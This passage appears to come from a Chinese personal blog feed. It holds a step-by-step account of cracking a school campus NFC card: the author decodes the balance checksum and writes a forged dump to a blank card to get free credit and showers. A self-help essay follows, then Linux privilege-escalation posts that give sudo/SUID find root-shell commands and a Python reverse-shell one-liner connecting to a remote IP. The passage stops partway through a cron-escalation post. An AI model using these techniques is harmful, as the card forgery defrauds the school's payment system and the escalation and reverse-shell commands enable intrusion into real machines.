src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/13.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/14.png" alt="我是如何破解学校一慧通的"></p><p>将十进制金额转换为十六进制为：</p><pre><code class="hljs basic"><span class="hljs-symbol">2985 </span>= BA9<span class="hljs-symbol">2983 </span>= BA7<span class="hljs-symbol">2933 </span>= B75</code></pre><p>可以看出</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">B</span><span class="hljs-keyword">A7 </span><span class="hljs-keyword">B</span><span class="hljs-keyword">75 </span><span class="hljs-keyword">B</span></code></pre><p>得出结论</p><pre><code class="hljs ini"><span class="hljs-attr">B2</span> = B<span class="hljs-attr">BC</span> = B<span class="hljs-attr">6E</span> = B</code></pre><p>当时想这个B是怎么来的，想了好久，后来发现，将两个不同的数据块进行xor运算：</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">xor </span><span class="hljs-keyword">B2 </span>= <span class="hljs-number">1</span>B<span class="hljs-built_in">A7</span> <span class="hljs-keyword">xor </span><span class="hljs-keyword">BC </span>= <span class="hljs-number">1</span>B<span class="hljs-number">75</span> <span class="hljs-keyword">xor </span><span class="hljs-number">6</span>E = <span class="hljs-number">1</span>B</code></pre><p><strong>xor是如何进行运算的</strong></p><p>例如：</p><pre><code class="hljs dns">A9 xor B2 = <span class="hljs-number">1</span>B将A9转换为二进制为<span class="hljs-number">10101001</span>将B2转换为二进制为<span class="hljs-number">10110010</span><span class="hljs-number">10101001</span><span class="hljs-number">10110010</span>————<span class="hljs-number">00011011</span>然后将<span class="hljs-number">00011011</span>转换成十六进制等于<span class="hljs-number">1</span>B</code></pre><p>我把金额改成40元</p><p>40转换成十六进制为：</p><p>40-4000-FA0</p><p>A0 xor ？= 1F</p><p>将A0转换为二进制为10100000</p><p>将1F转换为二进制为11111</p><p>10100000</p><p>​       ？</p><p>————</p><p>   11111</p><p>可以得出问好区域是10111111</p><p>10111111转换为十六进制为BF</p><p>直接在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/15.png" alt="我是如何破解学校一慧通的"></p><p>直接保存为40.dump</p><p>通过NFCGUI-PRO.exe软件将dump文件写入到空白卡片中：</p><p><strong>如图:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/16.png" alt="我是如何破解学校一慧通的"></p><p>打开NFCGUI-PRO.exe软件后DUMP和Key文件选择加载文件40.dump</p><p>将ACR122U插入到电脑后将空白卡片放到读卡器上后选择写入文件</p><p>写入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/17.png" alt="我是如何破解学校一慧通的"></p><p>当我拿去测试时，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/18.png" alt="我是如何破解学校一慧通的"></p><p>没错，读不出来……</p><p>然后我的思绪就这样断了…</p><p>我又拿水卡刷了几次后，卡内余额剩余25.90时，终于又发现了….</p><p><strong>如图：</strong></p><p>余额：29.33元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/19.png" alt="我是如何破解学校一慧通的"></p><p>余额：25.90元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/20.png" alt="我是如何破解学校一慧通的"></p><p>把金额转换为十六进制</p><pre><code class="hljs apache"><span class="hljs-attribute">29</span>.<span class="hljs-number">33</span>—<span class="hljs-number">2933</span>—B<span class="hljs-number">75</span><span class="hljs-attribute">25</span>.<span class="hljs-number">90</span>—<span class="hljs-number">2590</span>—A<span class="hljs-number">1</span>E</code></pre><p>这样子应该就可以看出了</p><p>40转换成十六进制为：</p><p><code>40-4000-FA0</code></p><p><font color='32CD32'>/*这些上面说过了，怕有些人看不懂我再写一下过程</font></p><p><font color='32CD32'>A0 xor ？= 1F</font></p><p><font color='32CD32'>将A0转换为二进制为10100000</font></p><p><font color='32CD32'>将1F转换为二进制为11111</font></p><p><font color='32CD32'>10100000</font></p><p><font color='32CD32'>       ？</font></p><p><font color='32CD32'>————</font></p><p><font color='32CD32'>   11111</font></p><p><font color='32CD32'>可以得出问好区域是10111111</font></p><p><font color='32CD32'>10111111转换为十六进制为BF</font></p><p><font color='32CD32'>*/</font></p><p>在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/21.png" alt="我是如何破解学校一慧通的"></p><p>存为40.dump</p><p>写入我就不再继续说了</p><p>我拿卡去测试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/22.png" alt="我是如何破解学校一慧通的"></p><p>破解成功！！！！</p><blockquote><p>改成999.99太张扬了，而且某些原因，没数据可以分析，所以我加到40就够了！</p></blockquote><h2 id="二、破解洗澡功能"><a href="#二、破解洗澡功能" class="headerlink" title="二、破解洗澡功能"></a>二、破解洗澡功能</h2><p>男寝装备落后，没有插卡机，花了我5块大洋激活洗澡功能。</p><p>经过妹子帮忙多次消费后（可惜那个妹子现在娃都会打酱油了），得出6次数据，4次自己卡中的数据，2次妹子卡中的数据。</p><p>经过对比扇区数据不同后，确定了金额的位置，</p><p>这4次是我自己的数据，如图：</p><p>3.14</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/23.png" alt="我是如何破解学校一慧通的"></p><p>3.20</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/24.png" alt="我是如何破解学校一慧通的"></p><p>4.22</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/25.png" alt="我是如何破解学校一慧通的"></p><p>5.00</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/26.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子卡中的两次数据，如图:</p><p>0.16</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/27.png" alt="我是如何破解学校一慧通的"></p><p>4.78</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/28.png" alt="我是如何破解学校一慧通的"></p><p>将金额转换成十六进制为：</p><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">14</span> = <span class="hljs-number">314</span> = <span class="hljs-number">13</span>A<span class="hljs-attribute">3</span>.<span class="hljs-number">20</span> = <span class="hljs-number">320</span> = <span class="hljs-number">140</span><span class="hljs-attribute">4</span>.<span class="hljs-number">22</span> = <span class="hljs-number">422</span> = <span class="hljs-number">1</span>A<span class="hljs-number">6</span><span class="hljs-attribute">5</span>.<span class="hljs-number">00</span> = <span class="hljs-number">500</span> = <span class="hljs-number">1</span>F<span class="hljs-number">4</span><span class="hljs-attribute">0</span>.<span class="hljs-number">16</span> = <span class="hljs-number">16</span> = <span class="hljs-number">10</span><span class="hljs-attribute">4</span>.<span class="hljs-number">78</span> = <span class="hljs-number">478</span> = <span class="hljs-number">1</span>DE</code></pre><p>我卡中的数据不同的区域用红色的标记起来：</p><p><strong>3.14</strong></p><p>00 00 00 35 A0 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 001E</p><p><strong>3.20</strong></p><p>00 00 00 35 A0 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 001E</p><p><strong>4.22</strong></p><p>00 00 00 35 A0 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 001E</p><p><strong>5.00</strong></p><p>00 00 00 35 A0 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 001E</p><p>我用3.14为例。<font color='red'>3A 01</font>区域有两处，可以看出金额3.14转换成十六进制是13A，后两位就是3A，第一位是1。这样就可以确定3A01是如何来的。</p><p>关于C5是如何来的，经过我多次分析加运算后得知</p><p><font color='Blue'>FF - 3A = C5</font> 这样一来也可以知道C5是如何得来的</p><p>我想把金额改成40元，40转换十六进制为40.00 =4000 = FA0</p><p>FF - A0 = 5F</p><p>可以得出40的数据为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>不过当我写进卡里时….</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/29.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子拍给我的照片….</p><p>后来我对比妹子的两个数据</p><p>0.16</p><p>00 00 00 72 6A <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00</p><p>1D E2 1D E2 <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00 1E</p><p>4.78</p><p>00 00 00 72 6A <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE</font> FF FF <font color='red'>DE 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE </font>FF FF <font color='red'>DE 01</font> 00 00 1E</p><p>又有一个地方产生了变化….</p><p>0.16时为FF，4.78为FE</p><p>计算得出加密方法：</p><p>0.16为例</p><p>FF xor EF = 10</p><p>10 + 00 = 10</p><p>经过多次运算，所有金额数据都符合这个规律</p><p>继续转到40的金额 </p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 001E</p><p>这是之前的数据</p><p>A0 + 0F = AF</p><p>? Xor 5F =AF</p><p>关于xor的运算之前已经说过这里就不多说了</p><p>得出结果为F0</p><p>将数据改为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>写进卡中后</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/30.png" alt="我是如何破解学校一慧通的"></p><p>成功，据说每次插进去都会少0.06，这就是传说中的吞钱？？</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>一卡通有三个功能，吃饭的功能没去研究，就这样吧。</p><p>文章写得简单，可过程经过多次测试与计算。</p><p>最后祝各位看到此文章的学子们在大学期间都能找到自己的真爱。</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个人开始废掉的3个迹象</title>
    <link href="/p/65c9d71c.html"/>
    <url>/p/65c9d71c.html</url>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是说：“马上马上，就看1分钟，再看1分钟！”</p><p>　　可问题是，1分钟常常演变成10分钟、1小时，甚至一整天。</p><p>　　我知道，网上有许多表弟感兴趣的内容，尤其系统还会根据他过去浏览的信息，有针对性地进行推送。比如表弟爱看幽默搞笑的段子，系统就会推送更多的类似视频给他。</p><p>　　但是，如果没有足够的自制力去抵御外界的诱惑，过度沉迷于即时快感，那离废掉也就不远了。</p><p>　　心理学上有一个“花盆效应”，说的是人如果在舒适的“花盆”中待久了，就容易不思进取、安于现状。</p><p>　　<strong>如果你天天禁锢在自己的小圈子里，沉溺在自己的舒适区不可自拔，而不是用心花时间提升自己，怎么可能走向更广阔的天地呢？</strong></p><p>　　人生如逆水行舟，不进则退。如果选择过分安逸，就会丧失斗志；如果丧失了斗志，生活就会越来越闲；如果越来越闲，最终就会和别人拉开一大截差距。</p><p>　　现在有多不思进取，将来被时代所抛弃时就有多后悔莫及。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>　　前几天，我的叔叔失业了，这沉重的一击害得他整天抽烟解闷，觉得在阿姨面前抬不起头来。</p><p>　　其实，叔叔的情况，我们都早有耳闻。他自认为自己技术过硬，曾经又获得过公司的先进，就终日懒懒散散、不思进取，躺在过去的功劳簿上睡大觉。</p><p>　　半年前，公司新招聘了个名校毕业的小伙子。小伙子吃苦耐劳，肯学肯干，技术水平早就在叔叔之上。</p><p>　　叔叔也不是没有危机感，但他觉得，自己年纪大了，记性也差了，现在要学新东西也难了，常常是一边嘴里满是焦虑，一边又没有实际行动。</p><p>　　现在工作被人取代，叔叔这才后悔莫及：试想，如果自己还是当年那个技术骨干，公司会让自己说走就走吗？</p><p>　　说到底，这是他自己长期满足于现状、停止学习的代价。</p><p>　　职场是个靠价值说话的地方，你有多少价值，决定了你能站上多高的位置。但凡有所成就的人，注定终身与读书和学习形影不离。</p><p>　　<strong>只要你还在学习，人生就有无限可能。</strong></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>　　两个月前，闺蜜再一次立下誓言：暴瘦20斤。</p><p>　　闺蜜是个吃货，见到啥好东西都管不住嘴，再加上迈不开腿，所以体重跟着蹭蹭蹭直线上升。</p><p>　　我激励她：“不减下来，别来见我。”在那之后，她果然坚持跑步了一阵子。但没多久，她就又一切照旧了。</p><p>　　“你不知道，跑多了腿酸。”</p><p>　　“这是下雪天啊！会冻死的啊！”</p><p>　　“啊，这么好吃的布丁，别拦我！”</p><p>　　她总会有这样七七八八的理由。所以，如今见到她，还是老样子。</p><p>　　生活中，总有一些人嚷嚷着要实现什么样的目标，却总是不能如愿，归根结底，缺的是自律。<strong>放弃了自律，迟早有一天要为过去的偷懒买单。</strong></p><p>　　有句话说得好：自律，出众；不自律，出局。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>　　没有人天生就是王者。</p><p>　　说到底，一个人能有怎样的人生，走在什么样的路上，是痛苦还是快乐、失败还是成功，最终取决于自己。</p><p>　　如果你的生活中，出现了不再愿意走出舒适区、停止了学习、放弃了自律这三种迹象，那就要提醒自己注意了。</p><p>　　因为，成功，属于懂得走出舒适区、积极进取的人；</p><p>　　属于坚持读书和学习的人；</p><p>　　属于能够保持高度自律的人。</p><p>　　<strong>与其怨天尤人，“望洋兴叹”，不如从现在开始，脚踏实地，不负韶华，努力成为更好的自己。</strong></p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之Sudo配置错误</title>
    <link href="/p/94404766.html"/>
    <url>/p/94404766.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之Suid提权</title>
    <link href="/p/a20c8cf4.html"/>
    <url>/p/a20c8cf4.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之定时任务</title>
    <link href="/p/75fd4604.html"/>
    <url>/p/75fd4604.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img 